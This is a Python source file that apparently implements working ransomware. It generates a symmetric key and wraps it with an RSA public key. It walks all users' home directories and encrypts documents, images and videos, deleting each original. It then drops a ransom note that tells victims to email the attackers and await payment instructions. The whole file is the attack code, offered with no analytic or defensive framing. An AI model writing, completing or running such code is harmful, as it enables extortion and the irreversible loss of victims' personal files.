from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization, hashes
import os
import platform


class SimpleCrypter:
    def __init__(self):
        self.key = None
        self.crypter = None
        self.public_key = None
        self.file_exts = ['txt', 'doc', 'pdf', 'jpg', 'png', 'mp4', 'mov', 'docx']

    def get_system_root(self):
        system = platform.system()
        if system == "Windows":
            return os.path.join(os.path.expanduser('~'), '..')  # Parent of user directory
        elif system in ["Linux", "Darwin"]:  # Linux ou macOS
            return '/home'
        else:
            raise OSError("Operating system not supported")

    def generate_key(self):
        self.key = Fernet.generate_key()
        self.crypter = Fernet(self.key)

    def encrypt_fernet_key(self):
        with open('keys/public_key.pem', 'rb') as f:
            self.public_key = serialization.load_pem_public_key(f.read())
        encrypted_key = self.public_key.encrypt(
            self.key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        with open('keys/encrypted_fernet_key.bin', 'wb') as f:
            f.write(encrypted_key)

    def crypt_file(self, file_path, encrypt=True):
        try:
            with open(file_path, 'rb') as file:
                data = file.read()

            if encrypt:
                _data = self.crypter.encrypt(data)
                new_file_path = file_path + '.encrypted'
            else:
                _data = self.crypter.decrypt(data)
                new_file_path = file_path[:-10]  # Remove '.encrypted'

            with open(new_file_path, 'wb') as file:
                file.write(_data)

            if encrypt:
                os.remove(file_path)

            print(f"{'Encrypted' if encrypt else 'Decrypted'}: {file_path}")
        except Exception as e:
            print(f"Error processing {file_path}: {e}")

    def crypt_system(self, encrypt=True):
        system_root = self.get_system_root()
        for root, _, files in os.walk(system_root):
            for file in files:
                if file.split('.')[-1] in self.file_exts:
                    file_path = os.path.join(root, file)
                    if encrypt:
                        if not file.endswith('.encrypted'):
                            self.crypt_file(file_path, encrypt=True)
                    else:
                        if file.endswith('.encrypted'):
                            self.crypt_file(file_path, encrypt=False)

    def create_instruction_file(self):
        instruction = """
      Your files have been encrypted.
      To decrypt them, follow these instructions:
      1. Contact us at decrypt@example.com
      2. Send the 'encrypted_fernet_key.bin' file to us
      3. Wait for instructions for payment and decryption
      DO NOT attempt to decrypt the files yourself as this may cause permanent data loss.
      """
        with open('INSTRUCTIONS.txt', 'w') as f:
            f.write(instruction)


def main():
    crypter = SimpleCrypter()
    crypter.generate_key()
    crypter.encrypt_fernet_key()
    crypter.crypt_system(encrypt=True)
    crypter.create_instruction_file()


if __name__ == '__main__':
    main()